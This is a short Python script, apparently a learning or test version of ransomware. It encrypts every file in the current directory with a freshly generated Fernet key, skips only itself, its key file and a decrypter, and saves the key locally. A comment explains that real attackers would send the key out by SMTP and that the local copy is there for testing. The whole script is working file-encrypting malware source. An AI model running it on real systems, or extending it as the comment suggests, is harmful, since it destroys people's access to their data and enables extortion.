import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "ransom.py" or file == "generated.key" or file == "ransomdecrypter.py":
		continue #do not encrypt the current file we are working with or the key
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()

print(key)

with open("generated.key","wb") as generatedkey:    #Hackers do not suddenly print the password on the target's computer, as is the case here. Normally smtp, input etc. methods deliver it to them. This is because it's for testing purposes.
	generatedkey.write(key)

for file in files:
	with open(file,"rb") as the_file:
		contents = the_file.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file,"wb") as the_file:
		the_file.write(contents_encrypted)